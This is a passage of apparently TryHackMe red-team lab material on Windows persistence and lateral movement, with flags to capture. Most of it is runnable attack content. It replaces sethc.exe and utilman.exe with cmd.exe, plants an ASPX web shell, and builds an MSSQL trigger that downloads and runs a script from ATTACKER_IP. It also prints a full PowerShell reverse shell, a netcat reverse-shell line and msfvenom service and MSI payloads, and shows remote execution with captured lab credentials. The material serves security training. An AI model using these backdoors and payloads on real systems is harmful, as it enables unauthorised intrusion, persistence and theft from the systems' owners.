![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/27e711818bea549ace3cf85279f339c8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/27e711818bea549ace3cf85279f339c8.png)

After pressing `SHIFT` 5 times, Windows will execute the binary in `C:\Windows\System32\sethc.exe`.
 If we are able to replace such binary for a payload of our preference, 
we can then trigger it with the shortcut. Interestingly, we can even do 
this from the login screen before inputting any credentials.

A straightforward way to backdoor the login screen consists of replacing `sethc.exe` with a copy of `cmd.exe`. That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.

To overwrite `sethc.exe`, we first need to take ownership 
of the file and grant our current user permission to modify it. Only 
then will we be able to replace it with a copy of `cmd.exe`. We can do so with the following commands:

Command Prompt

```
C:\> takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
        1 file(s) copied.
```

After doing so, lock your session from the start menu:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2faf2bec5763297beb7c921858900c57.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2faf2bec5763297beb7c921858900c57.png)

You should now be able to press `SHIFT` five times to access a terminal with SYSTEM privileges directly from the login screen:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5062148957ec1d70dccd080bdca93ddf.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5062148957ec1d70dccd080bdca93ddf.png)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/362875749378007cc447a2e47d476c9b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/362875749378007cc447a2e47d476c9b.png)

From your newly obtained terminal, execute

```
C:\flags\flag14.exe
```

to get your flag!

# Utilman

Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/73c7698a015de5a988fd815ff3e41473.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/73c7698a015de5a988fd815ff3e41473.png)

When we click the ease of access button on the login screen, it executes `C:\Windows\System32\Utilman.exe` with SYSTEM privileges. If we replace it with a copy of `cmd.exe`, we can bypass the login screen again.

To replace `utilman.exe`, we do a similar process to what we did with `sethc.exe`:

Command Prompt

```
C:\> takeown /f c:\Windows\System32\utilman.exe

SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\utilman.exe /grant Administrator:F
processed file: C:\Windows\System32\utilman.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
        1 file(s) copied.
```

To trigger our terminal, we will lock our screen from the start button:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1f94b28361ffebbf70d280755821bc12.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1f94b28361ffebbf70d280755821bc12.png)

And finally, proceed to click on the "Ease of Access" button. Since we replaced `utilman.exe` with a `cmd.exe` copy, we will get a command prompt with SYSTEM privileges:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0fe1901296108241e2700abf87fa6a27.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0fe1901296108241e2700abf87fa6a27.png)

**Persisting Through Existing Services**

If you don't want to 
use Windows features to hide a backdoor, you can always profit from any 
existing service that can be used to run code for you. This task will 
look at how to plant backdoors in a typical web server setup. Still, any
 other application where you have some degree of control on what gets 
executed should be backdoorable similarly. The possibilities are 
endless!

# Using Web Shells

The usual way of achieving persistence in a web server is by 
uploading a web shell to the web directory. This is trivial and will 
grant us access with the privileges of the configured user in IIS, which
 by default is `iis apppool\defaultapppool`. Even if this is an unprivileged user, it has the special `SeImpersonatePrivilege`,
 providing an easy way to escalate to the Administrator using various 
known exploits. For more information on how to abuse this privilege, see
 the [Windows Privesc Room](https://tryhackme.com/room/windowsprivesc20).

Let's start by downloading an ASP.NET web shell. A ready to use web shell is provided [here](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx),
 but feel free to use any you prefer. Transfer it to the victim machine 
and move it into the webroot, which by default is located in the `C:\inetpub\wwwroot` directory:

Command Prompt

```
C:\> move shell.aspx C:\inetpub\wwwroot\
```

**Note:** Depending on the way you create/transfer `shell.aspx`,
 the permissions in the file may not allow the web server to access it. 
If you are getting a Permission Denied error while accessing the shell's
 URL, just grant everyone full permissions on the file to get it 
working. You can do so with `icacls shell.aspx /grant Everyone:F`.

We can then run commands from the web server by pointing to the following URL:

`http://MACHINE_IP/shell.aspx`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d9845057ebf54a61401ca61c2c268fe8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d9845057ebf54a61401ca61c2c268fe8.png)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/362875749378007cc447a2e47d476c9b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/362875749378007cc447a2e47d476c9b.png)

Use your web shell to execute

```
C:\flags\flag16.exe
```

to get your flag!

While web shells provide a simple way to leave a backdoor on a 
system, it is usual for blue teams to check file integrity in the web 
directories. Any change to a file in there will probably trigger an 
alert.

# Using MSSQL as a Backdoor

There are several ways to plant backdoors in MSSQL Server 
installations. For now, we will look at one of them that abuses 
triggers. Simply put, **triggers** in MSSQL allow you to 
bind actions to be performed when specific events occur in the database.
 Those events can range from a user logging in up to data being 
inserted, updated or deleted from a given table. For this task, we will 
create a trigger for any INSERT into the `HRDB` database.

Before creating the trigger, we must first reconfigure a few things on the database. First, we need to enable the `xp_cmdshell` stored procedure. `xp_cmdshell`
 is a stored procedure that is provided by default in any MSSQL 
installation and allows you to run commands directly in the system's 
console but comes disabled by default.

To enable it, let's open `Microsoft SQL Server Management Studio 18`, available from the start menu. When asked for authentication, just use **Windows Authentication**
 (the default value), and you will be logged on with the credentials of 
your current Windows User. By default, the local Administrator account 
will have access to all DBs.

Once logged in, click on the **New Query** button to open the query editor:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/eb3aaca1ed1da7d1e08f0c3069a5633a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/eb3aaca1ed1da7d1e08f0c3069a5633a.png)

Run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enable `xp_cmdshell`.

```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

After this, we must ensure that any website accessing the database can run `xp_cmdshell`. By default, only database users with the `sysadmin`
 role will be able to do so. Since it is expected that web applications 
use a restricted database user, we can grant privileges to all users to 
impersonate the `sa` user, which is the default database administrator:

```sql
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

After all of this, we finally configure a trigger. We start by changing to the `HRDB` database:

```sql
USE HRDB

```

Our trigger will leverage `xp_cmdshell` to execute Powershell to download and run a `.ps1` file from a web server controlled by the attacker. The trigger will be configured to execute whenever an `INSERT` is made into the `Employees` table of the `HRDB` database:

```sql
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';

```

Now that the backdoor is set up, let's create `evilscript.ps1` in our attacker's machine, which will contain a Powershell reverse shell:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

We will need to open two terminals to handle the connections involved in this exploit:

- The trigger will perform the first connection to download and execute `evilscript.ps1`. Our trigger is using port 8000 for that.
- The second connection will be a reverse shell on port 4454 back to our attacker machine.

| AttackBox
        

`user@AttackBox$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...` | **** | AttackBox
        

`user@AttackBox$ nc -lvp 4454Listening on 0.0.0.0 4454` |
| --- | --- | --- |

### **LATERAL MOVEMENT**

**Moving Through the Network**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/927cb0238daf85062962ecaa1714e80a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/927cb0238daf85062962ecaa1714e80a.png)

## What is Lateral Movement?

Simply put, lateral movement is the group of techniques used by 
attackers to move around a network. Once an attacker has gained access 
to the first machine of a network, moving is essential for many reasons,
 including the following: - Reaching our goals as attackers - Bypassing 
network restrictions in place - Establishing additional points of entry 
to the network - Creating confusion and avoid detection.

While many cyber kill chains reference lateral movement as an 
additional step on a linear process, it is actually part of a cycle. 
During this cycle, we use any available credentials to perform lateral 
movement, giving us access to new machines where we elevate privileges 
and extract credentials if possible. With the newfound credentials, the 
cycle starts again.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/beccc46f65b8d16117d3d62f5c5dc380.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/beccc46f65b8d16117d3d62f5c5dc380.png)

Usually, we will repeat this cycle several times before reaching our 
final goal on the network. If our first foothold is a machine with very 
little access to other network resources, we might need to move 
laterally to other hosts that have more privileges on the network.

## A Quick Example

Suppose we are performing a red team engagement where our final goal 
is to reach an internal code repository, where we got our first 
compromise on the target network by using a phishing campaign. Usually, 
phishing campaigns are more effective against non-technical users, so 
our first access might be through a machine in the Marketing department.

Marketing workstations will typically be limited through firewall 
policies to access any critical services on the network, including 
administrative protocols, database ports, monitoring services or any 
other that aren't required for their day to day labour, including code 
repositories.

To reach sensitive hosts and services, we need to move to other hosts
 and pivot from there to our final goal. To this end, we could try 
elevating privileges on the Marketing workstation and extracting local 
users' password hashes. If we find a local administrator, the same 
account may be present on other hosts. After doing some recon, we find a
 workstation with the name DEV-001-PC. We use the local administrator's 
password hash to access DEV-001-PC and confirm it is owned by one of the
 developers in the company. From there, access to our target code 
repository is available.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/89ef601e2332f96e45c64b3baa8d6349.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/89ef601e2332f96e45c64b3baa8d6349.png)

Notice
 that while lateral movement might need to be used to circumvent 
firewall restrictions, it is also helpful in evading detection. In our 
example, even if the Marketing workstation had direct access to the code
 repository, it is probably desirable to connect through the developer's
 PC. This behaviour would be less suspicious from the standpoint of a 
blue team analyst checking login audit logs.

## The Attacker's Perspective

There are several ways in which an attacker can move laterally. The simplest way would be to use standard administrative protocols like WinRM, RDP,
 VNC or SSH to connect to other machines around the network. This 
approach can be used to emulate regular users' behaviours somewhat as 
long as some coherence is maintained when planning where to connect with
 what account. While a user from IT connecting to the web server via RDP
 might be usual and go under the radar, care must be taken not to 
attempt suspicious connections (e.g. why is the local admin user connecting to the DEV-001-PC from the Marketing-PC?).

Attackers nowadays also have other methods of moving laterally while 
making it somewhat more challenging for the blue team to detect what is 
happening effectively.
 While no technique should be considered infallible, we can at least 
attempt to be as silent as possible. In the following tasks, we will 
look at some of the most common lateral movement techniques available.

## Administrators and UAC

While performing most of the lateral movement techniques introduced 
throughout the room, we will mainly use administrator credentials. While
 one might expect that every single administrator account would serve 
the same purpose, a distinction has to be made between two types of 
administrators:

- Local accounts part of the local Administrators group
- Domain accounts part of the local Administrators group

The differences we are interested in are restrictions imposed by **User Account Control (UAC)**
 over local administrators (except for the default Administrator 
account). By default, local administrators won't be able to remotely 
connect to a machine and perform administrative tasks unless using an 
interactive session through RDP.
 Windows will deny any administrative task requested via RPC, SMB or 
WinRM since such administrators will be logged in with a filtered medium
 integrity token, preventing the account from doing privileged actions. 
The only local account that will get full privileges is the default 
Administrator account.

Domain accounts with local administration privileges won't be subject
 to the same treatment and will be logged in with full administrative 
privileges.

This security feature can be disabled if desired, and sometimes
 you will find no difference between local and domain accounts in the 
administrator's group. Still, it's essential to keep in mind that should
 some of the lateral movement techniques fail, it might be due to using a
 non-default local administrator where UAC is enforced. You can read more details about this security feature [here](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction).

**Spawning Processes Remotely**

This task will look at 
the available methods an attacker has to spawn a process remotely, 
allowing them to run commands on machines where they have valid 
credentials. Each of the techniques discussed uses slightly different 
ways to achieve the same purpose, and some of them might be a better fit
 for some specific scenarios.

## Psexec

- **Ports:** 445/TCP (SMB)
- **Required Group Memberships:** Administrators

Psexec has been the go-to method when needing to execute processes 
remotely for years. It allows an administrator user to run commands 
remotely on any PC where he has access. Psexec is one of many 
Sysinternals Tools and can be downloaded [here](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).

The way psexec works is as follows:

1. Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.
2. Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with `C:\Windows\psexesvc.exe`.
3. Create some named pipes to handle stdin/stdout/stderr.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a488102fe0da47a3667961400cf298d8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a488102fe0da47a3667961400cf298d8.png)

To run psexec, we only need to supply the required administrator 
credentials for the remote host and the command we want to run (`psexec64.exe` is available under `C:\tools` in THMJMP2 for your convenience):

```
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

## Remote Process Creation Using WinRM

- **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Remote Management Users

Windows Remote Management (WinRM) is a web-based protocol used to 
send Powershell commands to Windows hosts remotely. Most Windows Server 
installations will have WinRM enabled by default, making it an 
attractive attack vector.

To connect to a remote Powershell session from the command line, we can use the following command:

```
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

We can achieve the same from Powershell, but to pass different credentials, we will need to create a PSCredential object:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Once we have our PSCredential object, we can create an interactive session using the Enter-PSSession cmdlet:

```powershell
Enter-PSSession -Computername TARGET -Credential $credential
```

Powershell also includes the Invoke-Command cmdlet, which runs 
ScriptBlocks remotely via WinRM. Credentials must be passed through a 
PSCredential object as well:

```powershell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

## Remotely Creating Services Using sc

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCE/RPC)
    - 445/TCP (RPC over SMB Named Pipes)
    - 139/TCP (RPC over SMB Named Pipes)
- **Required Group Memberships:** Administrators

Windows services can also be leveraged to run arbitrary commands 
since they execute a command when started. While a service executable is
 technically different from a regular application, if we configure a 
Windows service to run any application, it will still execute it and 
fail afterwards.

We can create a service on a remote host with sc.exe, a standard tool
 available in Windows. When using sc, it will try to connect to the 
Service Control Manager (SVCCTL) remote service program through RPC in 
several ways:

1. A connection attempt will be made using DCE/RPC. The client will
first connect to the Endpoint Mapper (EPM) at port 135, which serves as a catalogue of available RPC endpoints and request information on the
SVCCTL service program. The EPM will then respond with the IP and port
to connect to SVCCTL, which is usually a dynamic port in the range of
49152-65535.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c4f288e73da9c0f4d480ad817b365fe5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c4f288e73da9c0f4d480ad817b365fe5.png)

1. If the latter connection fails, sc will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0c425c37d692c771c944e38dca8c5879.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0c425c37d692c771c944e38dca8c5879.png)

We can create and start a service named "THMservice" using the following commands:

```
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

The "net user" command will be executed when the service is started, 
creating a new local user on the system. Since the operating system is 
in charge of starting the service, you won't be able to look at the 
command output.

To stop and delete the service, we can then execute the following commands:

```
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

## Creating Scheduled Tasks Remotely

Another Windows feature we can use is Scheduled Tasks. You can create
 and run one remotely with schtasks, available in any Windows 
installation. To create a task named THMtask1, we can use the following 
commands:

```
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00

schtasks /s TARGET /run /TN "THMtask1"

```

We set the schedule type (/sc) to ONCE, which means the task is 
intended to be run only once at the specified time and date. Since we 
will be running the task manually, the starting date (/sd) and starting 
time (/st) won't matter much anyway.

Since the system will run the scheduled task, the command's output won't be available to us, making this a blind attack.

Finally, to delete the scheduled task, we can use the following command and clean up after ourselves:

```
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

## Let's Get to Work!

To complete this exercise, you will need to connect to THMJMP2 using the credentials assigned to you in Task 1 from [http://distributor.za.tryhackme.com/creds](http://distributor.za.tryhackme.com/creds). If you haven't done so yet, click on the link and get credentials now. Once you have your credentials, connect to THMJMP2 via SSH:

`ssh za\\<AD Username>@thmjmp2.za.tryhackme.com`

For this exercise, we will assume we have already captured some credentials with administrative access:

**User:** ZA.TRYHACKME.COM\t1_leonard.summers

**Password:** EZpass4ever

We'll show how to use those credentials to move laterally to THMIIS using `sc.exe`. Feel free to try the other methods, as they all should work against THMIIS.

While we have already shown how to use sc to create a user on a remote system (by using `net user`),
 we can also upload any binary we'd like to execute and associate it 
with the created service. However, if we try to run a reverse shell 
using this method, we will notice that the reverse shell disconnects 
immediately after execution. The reason for this is that service
 executables are different to standard .exe files, and therefore 
non-service executables will end up being killed by the service manager 
almost immediately. Luckily for us, msfvenom supports the `exe-service`
 format, which will encapsulate any payload we like inside a fully 
functional service executable, preventing it from getting killed.

To create a reverse shell, we can use the following command:

**Note:**
 Since you will be sharing the lab with others, you'll want to use a 
different filename for your payload instead of "myservice.exe" to avoid 
overwriting someone else's payload.

AttackBox

```
user@AttackBox$ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
```

We will then proceed to use t1_leonard.summers credentials to upload 
our payload to the ADMIN$ share of THMIIS using smbclient from our 
AttackBox:

AttackBox

```
user@AttackBox$ smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever putting file myservice.exe as \myservice.exe (0.0 kb/s) (average 0.0 kb/s)
```

Once our executable is uploaded, we will set up a listener on the attacker's machine to receive the reverse shell from `msfconsole`:

AttackBox

```
user@AttackBox$ msfconsolemsf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.10.16:4444
```

Alternatively, you can run the following one-liner on your Linux console to do the same:

AttackBox

```
user@AttackBox$ msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"
```

Since `sc.exe` doesn't allow us to specify credentials as part of the command, we need to use `runas` to spawn a new shell with t1_leonard.summer's access token. Still, we only have SSH access to the machine, so if we tried something like `runas /netonly /user:ZA\t1_leonard.summers cmd.exe`,
 the new command prompt would spawn on the user's session, but we would 
have no access to it. To overcome this problem, we can use runas to 
spawn a second reverse shell with t1_leonard.summers access token:

THMJMP2: Command Prompt

```
C:\> runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
```

**Note:** Remember that since you are using `runas` with the `/netonly` option, it will not bother to check if the provided credentials are valid (more info on this on the [Enumerating AD room](https://tryhackme.com/room/adenumeration)), so be sure to type the password correctly. If you don't, you will see some ACCESS DENIED errors later in the room.

We can receive the reverse shell connection using nc in our AttackBox as usual:

AttackBox

```
user@AttackBox$ nc -lvp 4443
```

And finally, proceed to create a new service remotely by using sc, associating it with our uploaded binary:

THMJMP2: Command Prompt (As t1_leonard.summers)

```
C:\> sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
C:\> sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
```

Be sure to change the name of your service to avoid clashing with other students.

Once
 you have started the service, you should receive a connection in your 
AttackBox from where you can access the first flag on t1_leonard.summers
 desktop.

**Moving Laterally Using WMI**

We can also perform many techniques discussed in the previous task differently by using Windows Management Instrumentation (WMI).
 WMI is Windows implementation of Web-Based Enterprise Management 
(WBEM), an enterprise standard for accessing management information 
across devices.

In simpler terms, WMI
 allows administrators to perform standard management tasks that 
attackers can abuse to perform lateral movement in various ways, which 
we'll discuss.

## Connecting to WMI From Powershell

Before being able to connect to WMI
 using Powershell commands, we need to create a PSCredential object with
 our user and password. This object will be stored in the $credential 
variable and utilised throughout the techniques on this task:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

We then proceed to establish a WMI session using either of the following protocols:

- **DCOM:** RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
- **Wsman:** WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

To establish a WMI
 session from Powershell, we can use the following commands and store 
the session on the $Session variable, which we will use throughout the 
room on the different techniques:

```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

The `New-CimSessionOption` cmdlet is used to configure the connection options for the WMI session, including the connection protocol. The options and credentials are then passed to the `New-CimSession` cmdlet to establish a session against a remote host.

## Remote Process Creation Using WMI

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

We can remotely spawn a process from Powershell by leveraging Windows Management Instrumentation (WMI), sending a WMI request to the Win32_Process class to spawn the process under the session we created before:

```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

Notice that WMI won't allow you to see the output of any command but will indeed create the required process silently.

On legacy systems, the same can be done using wmic from the command prompt:

```
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"
```

## Creating Services Remotely with WMI

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

We can create services with WMI through Powershell. To create a service called THMService2, we can use the following command:

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

And then, we can get a handle on the service and start it with the following commands:

```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

Finally, we can stop and delete the service with the following commands:

```powershell
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

## Creating Scheduled Tasks Remotely with WMI

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

We can create and execute scheduled tasks by using some cmdlets available in Windows default installations:

```powershell
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

To delete the scheduled task after it has been used, we can use the following command:

```powershell
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

## Installing MSI packages through WMI

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. The file can be copied in any way available to the attacker. Once the MSI file is in the target system, we can attempt to install it by invoking the Win32_Product class through WMI:

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

We can achieve the same by us using wmic in legacy systems:

```
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

## Let's Get to Work!

To complete this exercise, you will need to connect to THMJMP2 using the credentials assigned to you on Task 1 from [http://distributor.za.tryhackme.com/creds](http://distributor.za.tryhackme.com/creds). If you haven't done so yet, click on the link and get credentials. Once you have your credentials, connect to THMJMP2 via SSH:

`ssh za\\<AD Username>@thmjmp2.za.tryhackme.com`

For this exercise, we will assume we have already captured some credentials with administrative access:

**User:** ZA.TRYHACKME.COM\t1_corine.waters

**Password:** Korine.1994

We'll show how to use those credentials to move laterally to THM-IIS using WMI and MSI packages. Feel free to try the other methods presented during this task.

We will start by creating our MSI payload with msfvenom from our attacker machine:

**Note:** Since you will be sharing the lab with others, you'll 
want to use a different filename for your payload instead of 
"myinstaller.msi" to avoid overwriting someone else's payload.

AttackBox

```
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
```

We then copy the payload using SMB or any other method available:

AttackBox

```
user@AttackBox$ smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994 putting file myinstaller.msi as \myinstaller.msi (0.0 kb/s) (average 0.0 kb/s)
```

Since we copied our payload to the ADMIN$ share, it will be available at C:\Windows\ on the server.

We start a handler to receive the reverse shell from Metasploit:

AttackBox

```
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 4445
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.10.16:4445
```

Let's start a WMI session against THMIIS from a Powershell console:

THMJMP2: Powershell

```
PS C:\> $username = 't1_corine.waters';
PS C:\> $password = 'Korine.1994';
PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

We then invoke the Install method from the Win32_Product class to trigger the payload:

THMJMP2: Powershell

```
PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

As a result, you should receive a connection in your AttackBox from where you can access a flag on t1_corine.waters desktop.

**Use of Alternate Authentication Material**

By alternate 
authentication material, we refer to any piece of data that can be used 
to access a Windows account without actually knowing a user's password 
itself. This is possible because of how some authentication protocols 
used by Windows networks work. In this task, we will take a look at a 
couple of alternatives available to log as a user when either of the 
following authentication protocols is available on the network:

- NTLM authentication
- Kerberos authentication

**Note:** During this task, you are assumed to be familiar with 
the methods and tools to extract credentials from a host. Mimikatz will 
